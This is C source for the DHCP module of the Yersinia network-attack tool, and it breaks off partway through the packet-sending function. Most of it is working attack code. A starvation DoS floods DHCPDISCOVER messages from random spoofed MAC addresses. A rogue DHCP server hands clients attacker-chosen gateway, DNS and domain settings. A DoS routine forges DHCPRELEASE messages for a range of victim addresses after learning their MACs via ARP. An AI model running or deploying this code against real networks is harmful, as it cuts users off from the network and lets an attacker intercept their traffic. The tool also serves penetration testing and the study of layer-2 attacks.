/* dhcp.c
 * Implementation for Dynamic Host Configuration Protocol
 *
 * Yersinia
 * By David Barroso <tomac@yersinia.net> and Alfredo Andres <slay@yersinia.net>
 * Copyright 2005, 2006, 2007 Alfredo Andres and David Barroso
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
 */

/* DHCP functions - please read RFC 2131 before complaining!!! */

#ifndef lint
static const char rcsid[] = 
       "$Id: dhcp.c 46 2007-05-08 09:13:30Z slay $";
#endif

#ifdef HAVE_CONFIG_H
#include <config.h>
#endif

#define _REENTRANT

#include <stdio.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>       

#ifdef HAVE_NETINET_IN_SYSTM_H
#include <netinet/in_systm.h>
#else
#ifdef HAVE_NETINET_IN_SYSTEM_H
#include <netinet/in_system.h>
#endif
#endif

#include <netinet/in.h>
#include <arpa/inet.h>
#include <signal.h>
#include <time.h>

#ifdef TIME_WITH_SYS_TIME
#include <sys/time.h>
#endif

#ifdef HAVE_UNISTD_H
#include <unistd.h>
#endif

#ifdef HAVE_STRING_H
#include <string.h>
#endif

#ifdef HAVE_STRINGS_H
#include <strings.h>
#endif

#ifdef HAVE_BSTRING_H
#include <bstring.h>
#endif

#ifdef STDC_HEADERS
#include <stdlib.h>
#endif

#ifdef HAVE_PTHREAD_H
#include <pthread.h>
#endif

#include <stdarg.h>

#include "dhcp.h"


void
dhcp_register(void)
{
   protocol_register(PROTO_DHCP,"DHCP","Dynamic Host Configuration Protocol",
         "dhcp", sizeof(struct dhcp_data), dhcp_init_attribs, NULL,
         dhcp_get_printable_packet, dhcp_get_printable_store,
         dhcp_load_values, dhcp_attack, dhcp_update_field,
         dhcp_features, dhcp_comm_params, SIZE_ARRAY(dhcp_comm_params), 
         dhcp_params_tlv, SIZE_ARRAY(dhcp_params_tlv), NULL, dhcp_init_comms_struct,
         PROTO_VISIBLE, dhcp_end);

   protocol_register_tlv(PROTO_DHCP, dhcp_edit_tlv, dhcp_type_desc, dhcp_tlv, 
                         SIZE_ARRAY(dhcp_tlv));
}


/*
 * Inicializa la estructura que se usa para relacionar el tmp_data
 * de cada nodo con los datos que se sacaran por pantalla cuando
 * se accede al demonio de red.
 * Teoricamente como esta funcion solo se llama desde term_add_node()
 * la cual, a su vez, solo es llamada al tener el mutex bloqueado por
 * lo que no veo necesario que sea reentrante. (Fredy). 
 */
int8_t
dhcp_init_comms_struct(struct term_node *node)
{
    struct dhcp_data *dhcp_data;
    void **comm_param;
 
    comm_param = (void *)calloc(1,sizeof(void *)*SIZE_ARRAY(dhcp_comm_params));
    
    if (comm_param == NULL)
    {
       thread_error("dhcp_init_commands_struct calloc error",errno);
       return -1;
    }

    dhcp_data = node->protocol[PROTO_DHCP].tmp_data;
    
    node->protocol[PROTO_DHCP].commands_param = comm_param;
    
    comm_param[DHCP_SMAC] = &dhcp_data->mac_source;
    comm_param[DHCP_DMAC] = &dhcp_data->mac_dest; 
    comm_param[DHCP_SIP] = &dhcp_data->sip;
    comm_param[DHCP_DIP] = &dhcp_data->dip;
    comm_param[DHCP_SPORT] = &dhcp_data->sport; 
    comm_param[DHCP_DPORT] = &dhcp_data->dport;
    /*comm_param[6] = &dhcp_data->fname; */
    comm_param[DHCP_OP] = &dhcp_data->op; 
    comm_param[DHCP_HTYPE] = &dhcp_data->htype; 
    comm_param[DHCP_HLEN] = &dhcp_data->hlen; 
    comm_param[DHCP_HOPS] = &dhcp_data->hops;
    comm_param[DHCP_XID] = &dhcp_data->xid;  
    comm_param[DHCP_SECS] = &dhcp_data->secs;
    comm_param[DHCP_FLAGS] = &dhcp_data->flags; 
    comm_param[DHCP_CIADDR] = &dhcp_data->ciaddr;
    comm_param[DHCP_YIADDR] = &dhcp_data->yiaddr;   
    comm_param[DHCP_SIADDR] = &dhcp_data->siaddr; 
    /* comm_param[17] = &dhcp_data->sname; */
    comm_param[DHCP_GIADDR] = &dhcp_data->giaddr; 
    comm_param[DHCP_CHADDR] = &dhcp_data->chaddr;   
/*    comm_param[18] = &dhcp_data->xid; 
    comm_param[19] = &dhcp_data->yiaddr; */

    return 0;
}


void
dhcp_th_send_raw(void *arg)
{
    struct attacks *attacks=NULL;
    struct dhcp_data *dhcp_data;
    sigset_t mask;
    u_int32_t aux_long;

    attacks = arg;
    
    pthread_mutex_lock(&attacks->attack_th.finished);

    pthread_detach(pthread_self());

    sigfillset(&mask);

    if (pthread_sigmask(SIG_BLOCK, &mask, NULL))
    {
       thread_error("dhcp_send_discover pthread_sigmask()",errno);
       dhcp_th_send_raw_exit(attacks);    
    }

    dhcp_data = attacks->data;

	/* Temporal fix */
	memcpy((void *)&aux_long, (void *)&dhcp_data->sip, 4);
	dhcp_data->sip = htonl(aux_long);
	memcpy((void *)&aux_long, (void *)&dhcp_data->dip, 4);
	dhcp_data->dip = htonl(aux_long);

    dhcp_send_packet(attacks);

    dhcp_th_send_raw_exit(attacks);
}


void
dhcp_th_send_raw_exit(struct attacks *attacks)
{
    if (attacks)
       attack_th_exit(attacks);

    pthread_mutex_unlock(&attacks->attack_th.finished);

    pthread_exit(NULL);
}


void
dhcp_th_send_discover(void *arg)
{
    struct attacks *attacks=NULL;
    struct dhcp_data *dhcp_data;
    sigset_t mask;

    attacks = arg;
    
    pthread_mutex_lock(&attacks->attack_th.finished);

    pthread_detach(pthread_self());

    sigfillset(&mask);

    if (pthread_sigmask(SIG_BLOCK, &mask, NULL))
    {
       thread_error("dhcp_send_discover pthread_sigmask()",errno);
       dhcp_th_send_discover_exit(attacks);    
    }

    dhcp_data = attacks->data;

    dhcp_send_discover(attacks);

    dhcp_th_send_discover_exit(attacks);
}

void
dhcp_th_send_discover_exit(struct attacks *attacks)
{
    if (attacks)
       attack_th_exit(attacks);
    
    pthread_mutex_unlock(&attacks->attack_th.finished);
    
    pthread_exit(NULL);
}

int8_t
dhcp_send_discover(struct attacks *attacks)
{
    struct dhcp_data *dhcp_data;

    dhcp_data = attacks->data;

    dhcp_data->sport = DHCP_CLIENT_PORT;
    dhcp_data->dport = DHCP_SERVER_PORT;
    
    dhcp_data->sip = 0;
    dhcp_data->dip = inet_addr("255.255.255.255");

    dhcp_data->op = LIBNET_DHCP_REQUEST;
    dhcp_data->options[2] = LIBNET_DHCP_MSGDISCOVER;
    dhcp_data->options[3] = LIBNET_DHCP_END;
    dhcp_data->options_len = 4;

    dhcp_send_packet(attacks);

    return 0;
}


void
dhcp_th_send_inform(void *arg)
{
    struct attacks *attacks=NULL;
    struct dhcp_data *dhcp_data;
    sigset_t mask;

    attacks = arg;
    
    pthread_mutex_lock(&attacks->attack_th.finished);

    pthread_detach(pthread_self());

    sigfillset(&mask);

    if (pthread_sigmask(SIG_BLOCK, &mask, NULL))
    {
       thread_error("dhcp_send_discover pthread_sigmask()",errno);
       dhcp_th_send_inform_exit(attacks);    
    }

    dhcp_data = attacks->data;

    dhcp_send_inform(attacks);

    dhcp_th_send_inform_exit(attacks);
}

void
dhcp_th_send_inform_exit(struct attacks *attacks)
{
    if (attacks)
       attack_th_exit(attacks);
    
    pthread_mutex_unlock(&attacks->attack_th.finished);
    
    pthread_exit(NULL);
}

int8_t
dhcp_send_inform(struct attacks *attacks)
{
    struct dhcp_data *dhcp_data;

    dhcp_data = attacks->data;

    dhcp_data->sport = DHCP_CLIENT_PORT;
    dhcp_data->dport = DHCP_SERVER_PORT;
    
    /* ciaddr = sip */
    memcpy((void *)&dhcp_data->ciaddr, (void *)&dhcp_data->sip, 4);
    /* FIXME: libnet consistency */
    dhcp_data->ciaddr = htonl(dhcp_data->ciaddr);

    dhcp_data->dip = inet_addr("255.255.255.255");

    dhcp_data->op = LIBNET_DHCP_REQUEST;
    dhcp_data->options[2] = LIBNET_DHCP_MSGINFORM;
    dhcp_data->options[3] = LIBNET_DHCP_END;
    dhcp_data->options_len = 4;

    dhcp_send_packet(attacks);

    return 0;
}

void
dhcp_th_send_offer(void *arg)
{
    struct attacks *attacks=NULL;
    struct dhcp_data *dhcp_data;
    sigset_t mask;

    attacks = arg;
    
    pthread_mutex_lock(&attacks->attack_th.finished);

    pthread_detach(pthread_self());

    sigfillset(&mask);

    if (pthread_sigmask(SIG_BLOCK, &mask, NULL))
    {
       thread_error("dhcp_send_discover pthread_sigmask()",errno);
       dhcp_th_send_offer(attacks);    
    }

    dhcp_data = attacks->data;

    dhcp_send_offer(attacks);

    dhcp_th_send_offer_exit(attacks);
}

void
dhcp_th_send_offer_exit(struct attacks *attacks)
{
    if (attacks)
       attack_th_exit(attacks);

    pthread_mutex_unlock(&attacks->attack_th.finished);
    
    pthread_exit(NULL);
}

int8_t
dhcp_send_offer(struct attacks *attacks)
{
    struct dhcp_data *dhcp_data;
    u_int32_t lbl32;

    dhcp_data = attacks->data;

    dhcp_data->sport = DHCP_SERVER_PORT;
    dhcp_data->dport = DHCP_CLIENT_PORT;

    lbl32 = libnet_get_prand(LIBNET_PRu32);
    memcpy((void *)&dhcp_data->sip, (void *) &lbl32, 4);

    lbl32 = libnet_get_prand(LIBNET_PRu32);
    memcpy((void *)&dhcp_data->dip, (void *) &lbl32, 4);

    dhcp_data->op = LIBNET_DHCP_REPLY;
    lbl32 = libnet_get_prand(LIBNET_PRu32);
    memcpy((void *)&dhcp_data->yiaddr, (void *) &lbl32, 4);
    dhcp_data->options[2] = LIBNET_DHCP_MSGOFFER;
    dhcp_data->options[3] = LIBNET_DHCP_SERVIDENT;
    dhcp_data->options[4] = 4;
    /* server identification = source ip */
    memcpy((void *) &dhcp_data->options[5], (void *) &dhcp_data->sip, 4);
    dhcp_data->options[9] = LIBNET_DHCP_LEASETIME;
    dhcp_data->options[10] = 4;

    lbl32 = libnet_get_prand(LIBNET_PRu32);
    memcpy((void *)&dhcp_data->options[11], (void *) &lbl32, 4);

    dhcp_data->options[15] = LIBNET_DHCP_END;

    dhcp_data->options_len = 16;

    dhcp_send_packet(attacks);

    return 0;
}

void
dhcp_th_send_request(void *arg)
{
    struct attacks *attacks=NULL;
    struct dhcp_data *dhcp_data;
    sigset_t mask;

    attacks = arg;
    
    pthread_mutex_lock(&attacks->attack_th.finished);

    pthread_detach(pthread_self());

    sigfillset(&mask);

    if (pthread_sigmask(SIG_BLOCK, &mask, NULL))
    {
       thread_error("dhcp_send_discover pthread_sigmask()",errno);
       dhcp_th_send_request_exit(attacks);    
    }

    dhcp_data = attacks->data;

    dhcp_send_request(attacks);

    dhcp_th_send_request_exit(attacks);
}

void
dhcp_th_send_request_exit(struct attacks *attacks)
{
    if (attacks)
       attack_th_exit(attacks);

    pthread_mutex_unlock(&attacks->attack_th.finished);
     
    pthread_exit(NULL);
}

int8_t
dhcp_send_request(struct attacks *attacks)
{
    struct dhcp_data *dhcp_data;
    u_int32_t lbl32;

    dhcp_data = attacks->data;

    dhcp_data->sport = DHCP_CLIENT_PORT;
    dhcp_data->dport = DHCP_SERVER_PORT;

    lbl32 = libnet_get_prand(LIBNET_PRu32);
    dhcp_data->sip = 0;

/*    lbl32 = libnet_get_prand(LIBNET_PRu32);
    memcpy((void *)&dhcp_data->dip, (void *) &lbl32, 4);*/
    dhcp_data->dip = inet_addr("192.168.0.100");

    dhcp_data->op = LIBNET_DHCP_REQUEST;
/*    lbl32 = libnet_get_prand(LIBNET_PRu32);
    memcpy((void *)&dhcp_data->yiaddr, (void *) &lbl32, 4);*/
    dhcp_data->options[2] = LIBNET_DHCP_MSGREQUEST;
    dhcp_data->options[3] = LIBNET_DHCP_SERVIDENT;
    dhcp_data->options[4] = 4;
    /* server identification = destination ip */
    memcpy((void *) &dhcp_data->options[5], (void *) &dhcp_data->dip, sizeof(u_int32_t));
    dhcp_data->options[9] = LIBNET_DHCP_DISCOVERADDR;
    dhcp_data->options[10] = 4;
    lbl32 = inet_addr("192.168.0.2");
    memcpy((void *)&dhcp_data->options[11], (void *)&lbl32, 4);
    dhcp_data->options[15] = LIBNET_DHCP_END;

    dhcp_data->options_len = 16;

    dhcp_send_packet(attacks);

    return 0;
}


int8_t
dhcp_send_release(struct attacks *attacks, u_int32_t server, u_int32_t ip, u_int8_t *mac_server, u_int8_t *mac_victim)
{
    struct dhcp_data *dhcp_data;
    u_int32_t lbl32;

    dhcp_data = attacks->data;

    memcpy((void *)dhcp_data->mac_source, (void *)mac_victim, ETHER_ADDR_LEN);
    memcpy((void *)dhcp_data->mac_dest, (void *)mac_server, ETHER_ADDR_LEN);
	
    dhcp_data->sport = DHCP_CLIENT_PORT;
    dhcp_data->dport = DHCP_SERVER_PORT;

    lbl32 = libnet_get_prand(LIBNET_PRu32);

    memcpy((void *)&dhcp_data->sip, (void *)&ip, 4);
    memcpy((void *)&dhcp_data->dip, (void *)&server, 4);

    dhcp_data->op = LIBNET_DHCP_REQUEST;
    dhcp_data->flags = 0;
    /* FIXME: libnet consistency */
    dhcp_data->ciaddr = htonl(ip);

/*    memcpy((void *)&dhcp_data->ciaddr, (void *)&ip, 4);*/

    memcpy((void *)dhcp_data->chaddr, (void *)mac_victim, ETHER_ADDR_LEN);

    dhcp_data->options[2] = LIBNET_DHCP_MSGRELEASE;
    dhcp_data->options[3] = LIBNET_DHCP_SERVIDENT;
    dhcp_data->options[4] = 4;
    /* server identification = destination ip */
    memcpy((void *) &dhcp_data->options[5], (void *) &dhcp_data->dip, sizeof(u_int32_t));
    dhcp_data->options[9] = LIBNET_DHCP_END;

    dhcp_data->options_len = 10;

    dhcp_send_packet(attacks);

    return 0;
}


void
dhcp_th_send_decline(void *arg)
{
    struct attacks *attacks=NULL;
    struct dhcp_data *dhcp_data;
    sigset_t mask;

    attacks = arg;
    
    pthread_mutex_lock(&attacks->attack_th.finished);

    pthread_detach(pthread_self());

    sigfillset(&mask);

    if (pthread_sigmask(SIG_BLOCK, &mask, NULL))
    {
       thread_error("dhcp_send_discover pthread_sigmask()",errno);
       dhcp_th_send_decline_exit(attacks);    
    }

    attacks = arg;
    dhcp_data = attacks->data;

    dhcp_send_decline(attacks);

    dhcp_th_send_decline_exit(attacks);
}

void
dhcp_th_send_decline_exit(struct attacks *attacks)
{
    if (attacks)
       attack_th_exit(attacks);

    pthread_mutex_unlock(&attacks->attack_th.finished);
     
    pthread_exit(NULL);
}

int8_t
dhcp_send_decline(struct attacks *attacks)
{
    struct dhcp_data *dhcp_data;
    u_int32_t lbl32;

    dhcp_data = attacks->data;

    dhcp_data->sport = DHCP_CLIENT_PORT;
    dhcp_data->dport = DHCP_SERVER_PORT;

    lbl32 = libnet_get_prand(LIBNET_PRu32);

/*    dhcp_data->dip = inet_addr("192.168.0.100");*/

    dhcp_data->op = LIBNET_DHCP_REQUEST;
    /* ciaddr must be 0 */
    dhcp_data->ciaddr = 0;
    memcpy((void *)dhcp_data->chaddr, dhcp_data->mac_source, ETHER_ADDR_LEN);
    dhcp_data->options[2] = LIBNET_DHCP_MSGDECLINE;
    dhcp_data->options[3] = LIBNET_DHCP_SERVIDENT;
    dhcp_data->options[4] = 4;
    /* server identification = destination ip */
    memcpy((void *) &dhcp_data->options[5], (void *) &dhcp_data->dip, sizeof(u_int32_t));
    dhcp_data->options[9] = LIBNET_DHCP_DISCOVERADDR;
    dhcp_data->options[10] = 4;
    lbl32 = inet_addr("192.168.0.3");
    memcpy((void *)&dhcp_data->options[11], (void *)&lbl32, 4);
    dhcp_data->options[15] = LIBNET_DHCP_END;

    dhcp_data->options_len = 16;

    dhcp_send_packet(attacks);

    return 0;
}

/*********************************/
/* DoS attack sending DHCPDISCOVER */
/*********************************/
void
dhcp_th_dos_send_discover(void *arg)
{
    struct attacks *attacks=NULL;
    struct dhcp_data *dhcp_data;
    sigset_t mask;

    attacks = arg;
    
    pthread_mutex_lock(&attacks->attack_th.finished);

    pthread_detach(pthread_self());

    sigfillset(&mask);

    if (pthread_sigmask(SIG_BLOCK, &mask, NULL))
    {
       thread_error("xstp_dos_conf pthread_sigmask()",errno);
       dhcp_th_dos_send_discover_exit(attacks);    
    }

    dhcp_data = attacks->data;

    while(!attacks->attack_th.stop)
    {
        attack_gen_mac(dhcp_data->mac_source);

        memcpy((void *)dhcp_data->chaddr, (void *)dhcp_data->mac_source,6);
        dhcp_send_discover(attacks);
#ifdef NEED_USLEEP
        thread_usleep(100000);
#endif
    }
    
    dhcp_th_dos_send_discover_exit(attacks);
}


void
dhcp_th_dos_send_discover_exit(struct attacks *attacks)
{
    if (attacks)
       attack_th_exit(attacks);

    pthread_mutex_unlock(&attacks->attack_th.finished);
     
    pthread_exit(NULL);
}

void
dhcp_th_rogue_server(void *arg)
{
    struct attacks *attacks=NULL;
    struct dhcp_data *dhcp_data;
    struct attack_param *param = NULL;
    struct timeval now;
    sigset_t mask;
    u_int8_t slen;
    char *ptr, **values, *top;
    int8_t got_discover, got_request;
    struct pcap_data p_data;
    u_int32_t lbl32;

    attacks = arg;
    
    pthread_mutex_lock(&attacks->attack_th.finished);

    pthread_detach(pthread_self());

    slen = 0;
    sigfillset(&mask);
    values = NULL;

    if (pthread_sigmask(SIG_BLOCK, &mask, NULL))
    {
       thread_error("dhcp_th_rogue_server_thread_sigmask()",errno);
       dhcp_th_rogue_server_exit(attacks);    
    }

    dhcp_data = attacks->data;
    param = attacks->params;
	
    /* til we exhaust the ip addresses pool!! */
    while (((*(u_int32_t *)param[DHCP_ROGUE_START_IP].value) <= 
              (*(u_int32_t *)param[DHCP_ROGUE_END_IP].value)) 
              && !attacks->attack_th.stop) 
    {
		/* Ok, let's wait for a DISCOVER guy! */
		if ((p_data.packet = calloc(1, SNAPLEN)) == NULL)
				break;
		if ((p_data.header = calloc(1, sizeof(struct pcap_pkthdr))) == NULL)
		{
			free(p_data.packet);
			break;
		}

		gettimeofday(&now,NULL);
			
		p_data.header->ts.tv_sec = now.tv_sec;
		p_data.header->ts.tv_usec = now.tv_usec;
					 
		got_discover = 0;
		got_request = 0;

	    while (!got_discover && !got_request && !attacks->attack_th.stop)
	    {
			interfaces_get_packet(attacks->used_ints, NULL, &attacks->attack_th.stop, p_data.header, p_data.packet, PROTO_DHCP, NO_TIMEOUT);
			if (attacks->attack_th.stop)
			{
				free(p_data.packet);
				free(p_data.header);
                dhcp_th_rogue_server_exit(attacks);
			}
			if ((values = dhcp_get_printable_packet(&p_data)) == NULL) 
			{
				write_log(0, "Error in dhcp_get_printable_packet\n");
				free(p_data.packet);
				free(p_data.header);
                dhcp_th_rogue_server_exit(attacks);
			}
			ptr = values[DHCP_TLV];
			top = ptr + (2*MAX_TLV*MAX_VALUE_LENGTH);

			while((ptr < top) && (strncmp(ptr, "MESSAGETYPE", 11) != 0)) 
					ptr += strlen(ptr) + 1;

			/* DISCOVER or REQUEST */
			if (strncmp(ptr+12, "01", 2) == 0)
				 got_discover = 1;
			if (strncmp(ptr+12, "03", 2) == 0)
				 got_request = 1;
	    }

        free(p_data.packet);
        free(p_data.header);

        if (attacks->attack_th.stop)
            dhcp_th_rogue_server_exit(attacks);
           
        dhcp_data->sport = DHCP_SERVER_PORT;
        dhcp_data->dport = DHCP_CLIENT_PORT;

        dhcp_data->op = LIBNET_DHCP_REPLY;

        memcpy((void *)&dhcp_data->sip, (void *)param[DHCP_ROGUE_SERVER].value, 4);
        lbl32 = htonl(*(u_int32_t *)param[DHCP_ROGUE_ROUTER].value);
        memcpy((void *)&dhcp_data->siaddr, (void *)&lbl32, 4);
        lbl32 = htonl(*(u_int32_t *)param[DHCP_ROGUE_START_IP].value);
        memcpy((void *)&dhcp_data->yiaddr, (void *)&lbl32, 4);
        dhcp_data->giaddr = 0;
        dhcp_data->dip = inet_addr("255.255.255.255");
        /* ciaddr must be 0 */
        dhcp_data->ciaddr = 0;

        dhcp_data->xid = strtoul(values[DHCP_XID], (char **)NULL, 16);
        parser_vrfy_mac(values[DHCP_SMAC], (u_int8_t *)dhcp_data->chaddr);

        dhcp_data->options[2] = (got_discover) ? LIBNET_DHCP_MSGOFFER : LIBNET_DHCP_MSGACK;
        dhcp_data->options[3] = LIBNET_DHCP_SERVIDENT;
        dhcp_data->options[4] = 4;

        /* server identification = source ip */
        memcpy((void *) &dhcp_data->options[5], (void *) &dhcp_data->sip, 4);
        dhcp_data->options[9] = LIBNET_DHCP_LEASETIME;
        dhcp_data->options[10] = 4;
        lbl32 = htonl(*(u_int32_t *)param[DHCP_ROGUE_LEASE].value);
        memcpy((void *)&dhcp_data->options[11], (void *)&lbl32, 4);
        dhcp_data->options[15] = LIBNET_DHCP_RENEWTIME;
        dhcp_data->options[16] = 4;
        lbl32 = htonl(*(u_int32_t *)param[DHCP_ROGUE_RENEW].value);
        memcpy((void *)&dhcp_data->options[17], (void *)&lbl32, 4);

        dhcp_data->options[21] = LIBNET_DHCP_SUBNETMASK;
        dhcp_data->options[22] = 4;
        memcpy((void *)&dhcp_data->options[23], (void *)param[DHCP_ROGUE_SUBNET].value, 4);
        dhcp_data->options[27] = LIBNET_DHCP_ROUTER;
        dhcp_data->options[28] = 4;
        memcpy((void *)&dhcp_data->options[29], (void *)param[DHCP_ROGUE_ROUTER].value, 4);
        dhcp_data->options[33] = LIBNET_DHCP_DNS;
        dhcp_data->options[34] = 4;
        memcpy((void *)&dhcp_data->options[35], (void *)param[DHCP_ROGUE_DNS].value, 4);
        dhcp_data->options[39] = LIBNET_DHCP_DOMAINNAME;
        slen = strlen(param[DHCP_ROGUE_DOMAIN].value);
        dhcp_data->options[40] = slen;
        memcpy((void *)&dhcp_data->options[41], (void *)param[DHCP_ROGUE_DOMAIN].value, slen);
        dhcp_data->options[40 + slen + 1] = LIBNET_DHCP_END;
        dhcp_data->options_len = 40 + slen + 2;

        dhcp_send_packet(attacks);

	    /* Next IP Address */
    	if (got_request)
	        (*(u_int32_t *)param[DHCP_ROGUE_START_IP].value) += htonl(0x01);
    }

    dhcp_th_rogue_server_exit(attacks);
}


void
dhcp_th_rogue_server_exit(struct attacks *attacks)
{
    if (attacks)
       attack_th_exit(attacks);

    pthread_mutex_unlock(&attacks->attack_th.finished);
     
    pthread_exit(NULL);
}


void
dhcp_th_dos_send_release(void *arg)
{
    struct attacks *attacks=NULL;
    struct dhcp_data *dhcp_data;
    struct attack_param *param = NULL;
    sigset_t mask;
    u_int8_t arp_mac[ETHER_ADDR_LEN];
    u_int8_t arp_server[ETHER_ADDR_LEN];
    u_int32_t aux_long, aux_long1;

    attacks = arg;
    
    pthread_mutex_lock(&attacks->attack_th.finished);

    pthread_detach(pthread_self());

    sigfillset(&mask);

    if (pthread_sigmask(SIG_BLOCK, &mask, NULL))
    {
       thread_error("dhcp_th_dos_send_release pthread_sigmask()",errno);
       dhcp_th_dos_send_release_exit(attacks);    
    }

    dhcp_data = attacks->data;

    param = attacks->params;

    memcpy((void *)&aux_long, (void *)param[DHCP_DOS_SEND_RELEASE_START_IP].value, 4);
    memcpy((void *)&aux_long1, (void *)param[DHCP_DOS_SEND_RELEASE_SERVER].value, 4);

    if (dhcp_send_arp_request(attacks, aux_long1) < 0)
	{
		write_log(0, "Error in dhcp_send_arp_request\n");
		dhcp_th_dos_send_release_exit(attacks);
	}

	/* MAC from the Server */
    if (dhcp_learn_mac(attacks, aux_long1, arp_server) < 0)
	{
		write_log(0, "Error in dhcp_learn_mac for the server\n");
		dhcp_th_dos_send_release_exit(attacks);
	}

	/* loop */

    while ((aux_long <= (*(u_int32_t *)param[DHCP_DOS_SEND_RELEASE_END_IP].value)) 
              && !attacks->attack_th.stop) 
    {

		if (dhcp_send_arp_request(attacks, aux_long) < 0)
		{
			write_log(0, "Error in dhcp_send_arp_request\n");
			dhcp_th_dos_send_release_exit(attacks);
		}

		/* MAC from the victim */
		if (dhcp_learn_mac(attacks, aux_long, arp_mac) < 0)
		{
			write_log(0, "Error in dhcp_learn_mac\n");
/*			dhcp_dos_send_release_exit(attacks);*/
		} else
		if (dhcp_send_release(attacks, aux_long1, aux_long, arp_server, arp_mac) < 0)
		{
			write_log(0, "Error in dhcp_send_release\n");
			dhcp_th_dos_send_release_exit(attacks);
		}

		/* Next ip address */
		aux_long += htonl(0x01);
	}

    dhcp_th_dos_send_release_exit(attacks);
}


void
dhcp_th_dos_send_release_exit(struct attacks *attacks)
{
    if (attacks)
       attack_th_exit(attacks);
 
     pthread_mutex_unlock(&attacks->attack_th.finished);
      
    pthread_exit(NULL);
}


int8_t
dhcp_send_arp_request(struct attacks *attacks, u_int32_t ip_dest)
{
    libnet_ptag_t t;
    libnet_t *lhandler;
    int32_t sent;
    struct dhcp_data *dhcp_data;
	char *mac_dest = "\xff\xff\xff\xff\xff\xff";
	char *mac_source = "\x00\x00\x00\x00\x00\x00";
/*	int8_t *ip_source="\x00\x00\x00\x00";*/
	u_int32_t aux_long;
   dlist_t *p;
   struct interface_data *iface_data;

    dhcp_data = attacks->data;

   for (p = attacks->used_ints->list; p; p = dlist_next(attacks->used_ints->list, p))
	{
      iface_data = (struct interface_data *) dlist_data(p);
      lhandler = iface_data->libnet_handler;

		aux_long = inet_addr(iface_data->ipaddr);
		t = libnet_build_arp(
					ARPHRD_ETHER, /* hardware addr */
					ETHERTYPE_IP, /* protocol addr */
					6,            /* hardware addr size */
					4,            /* protocol addr size */
					ARPOP_REQUEST,  /* operation type */
					(attacks->mac_spoofing)?dhcp_data->mac_source:iface_data->etheraddr,   /* sender hardware address */
					(u_int8_t *)&aux_long,    /* sender protocol addr */
					(u_int8_t *)mac_source, /* target hardware addr */
					(u_int8_t *)&ip_dest,      /* target protocol addr */
					NULL,         /* payload */
					0,            /* payload size */
					lhandler,     /* libnet context */
					0);           /* libnet id */

		if (t == -1)
		{
			thread_libnet_error("Can't build arp header",lhandler);
			libnet_clear_packet(lhandler);
			return -1;
		}

		t = libnet_build_ethernet(
				  (u_int8_t *)mac_dest,  /* dest mac */
				  (attacks->mac_spoofing) ? dhcp_data->mac_source : iface_data->etheraddr, /* src mac*/
				  ETHERTYPE_ARP,       /* type */
				  NULL,   /* payload */
				  0, /* payload size */
				  lhandler,             /* libnet handle */
				  0);                   /* libnet id */

/*			t = libnet_autobuild_ethernet(
					mac_dest,                               ethernet destination 
					ETHERTYPE_ARP,                           protocol type 
					lhandler);                                      libnet handle */
		if (t == -1)
		{
			thread_libnet_error("Can't build ethernet header",lhandler);
			libnet_clear_packet(lhandler);
			return -1;
		}

		/*
		 *  Write it to the wire.
		 */
		sent = libnet_write(lhandler);

		if (sent == -1) {
			thread_libnet_error("libnet_write error", lhandler);
			libnet_clear_packet(lhandler);
			return -1;
		}

		libnet_clear_packet(lhandler);
	}

    return 0;
}


int8_t
dhcp_learn_mac(struct attacks *attacks, u_int32_t ip_dest, u_int8_t *arp_mac)
{
    struct dhcp_data *dhcp_data;
    struct libnet_ethernet_hdr *ether;
    int8_t gotit=0;
    u_int8_t *cursor, rec_packets;
    struct pcap_data p_data;
    struct timeval now;
    struct interface_data *iface_data;
    
    dhcp_data = attacks->data;
	rec_packets = 0;

	if ((p_data.packet = calloc(1, SNAPLEN)) == NULL)
			return -1;
	if ((p_data.header = calloc(1, sizeof(struct pcap_pkthdr))) == NULL)
	{
		free(p_data.packet);
		return -1;
	}

	gettimeofday(&now, NULL);
		
	p_data.header->ts.tv_sec = now.tv_sec;
	p_data.header->ts.tv_usec = now.tv_usec;
				 
	/* Ok, we are waiting for an ARP packet for 5 seconds, and we'll wait
	 * forever (50 ARP packets) for the real packet... */
    while (!attacks->attack_th.stop && !gotit & (rec_packets < 50))
    {
       
		  rec_packets++;
        thread_usleep(800000);
        if (interfaces_get_packet(attacks->used_ints, NULL, &attacks->attack_th.stop, p_data.header, p_data.packet,
                               PROTO_ARP, 5) < 0) {
			write_log(0, "Timeout waiting for an ARP Reply...\n");
			break;
    }

    if (attacks->attack_th.stop)
       break;   

	 ether = (struct libnet_ethernet_hdr *) p_data.packet;

    iface_data = (struct interface_data *) dlist_data(attacks->used_ints->list);
    if ( !memcmp((attacks->mac_spoofing)?dhcp_data->mac_source:iface_data->etheraddr, 
                    ether->ether_shost, 6) )
       continue; /* Oops!! Its our packet... */
        
/*        if ( memcmp((attacks->mac_spoofing)?dhcp_data->mac_source:interfaces[0].etheraddr,
                     ether->_802_3_dhost,6))
           continue;  Not a response... */
        
        cursor = (u_int8_t *) (p_data.packet + LIBNET_ETH_H);

        cursor+=14;

        if (memcmp((void *)cursor,(void *)&ip_dest,4))
           continue;

        memcpy((void *)arp_mac,(void *)ether->ether_shost,6);
 
        write_log(0, " ARP Pillada MAC = %02X:%02X:%02X:%02X:%02X:%02X\n",
              ether->ether_shost[0], ether->ether_shost[1], ether->ether_shost[2],
              ether->ether_shost[3], ether->ether_shost[4], ether->ether_shost[5]);
         
        gotit = 1;
             
    } /* !stop */

    free(p_data.packet);
    free(p_data.header);

    if (!gotit)
        return -1;   
	else
        return 0;
}


int8_t
dhcp_send_packet(struct attacks *attacks)
{
    libnet_ptag_t t;
    int sent;
    struct dhcp_data *dhcp_data;
    libnet_t *lhandler;
    dlist_t *p;
    struct interface_data *iface_data;
    struct interface_data *iface_data2;

    dhcp_data = attacks->data;

    for (p = attacks->used_ints->list; p; p = dlist_next(attacks->used_ints->list, p)) {
       iface_data = (struct interface_data *) dlist_data(p);
            lhandler = iface_data->libnet_handler;

            t = libnet_build_dhcpv4(
                dhcp_data->op,                          /* opcode */
                dhcp_data->htype,                       /* hardware type */
                dhcp_data->hlen,                        /* hardware address length */
